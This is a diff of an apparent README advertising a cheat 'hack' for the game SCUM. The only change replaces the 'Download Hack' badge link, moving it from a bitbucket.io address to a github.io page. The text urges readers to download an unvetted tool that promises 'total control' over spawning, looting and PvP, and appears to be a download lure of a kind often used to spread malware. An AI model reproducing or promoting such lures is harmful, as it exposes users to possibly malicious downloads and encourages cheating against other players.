@@ -4,7 +4,7 @@ SCUM isn’t just another survival game — it’s a full-on simulation of hunge
 
 No more dying to puppets. No more getting sniped in bunkers. This hack gives you **total control**, from spawn to loot to PvP.
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload4.bitbucket.io)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://SCUM-Hack-dil3.github.io/.github)
 ---
 
 ## 🧠 What Is the SCUM Hack?
